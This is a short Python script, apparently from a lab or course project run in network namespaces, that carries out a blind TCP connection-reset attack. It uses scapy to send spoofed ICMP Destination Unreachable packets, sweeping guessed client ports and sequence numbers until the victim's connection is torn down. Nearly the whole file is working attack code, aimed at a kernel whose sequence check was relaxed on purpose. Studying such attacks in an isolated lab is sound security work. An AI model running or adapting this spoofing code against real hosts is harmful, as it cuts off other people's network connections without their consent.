"""
blind_reset.py  —  ATTACK 1: Blind Connection-Reset via ICMP (report §Phase 4).
Owner: ANISA

Spoof ICMP Destination Unreachable packets (Type 3) that quote the victim's
TCP 4-tuple. On the custom-5.15 kernel (relaxed seq check) the client's TCP
stack maps the "hard error" to ECONNRESET and tears the connection down.

Run inside the ATTACKER namespace:
    sudo ip netns exec attacker python3 -m attack1_reset.blind_reset
"""

from scapy.all import send
from common import config, packet_utils
from attack1_reset import infer_tuple


def run():
    print("[*] Attack 1 (blind reset) — sweeping ports x seq guesses...")
    sent = 0
    for port in infer_tuple.candidate_ports():
        for seq in infer_tuple.candidate_seqs():
            pkt = packet_utils.build_dest_unreachable(client_port=port, seq=seq)
            send(pkt, verbose=0)          # spoofed src is set inside the builder
            sent += 1
            # TODO(Anisa): watch the connection and STOP when it dies:
            #   - poll `ss -tan` in the client ns for the flow disappearing, OR
            #   - have run_attack1.sh detect teardown and kill this process.
    print(f"[+] Done. Sent {sent} spoofed ICMP packets.")


if __name__ == "__main__":
    run()
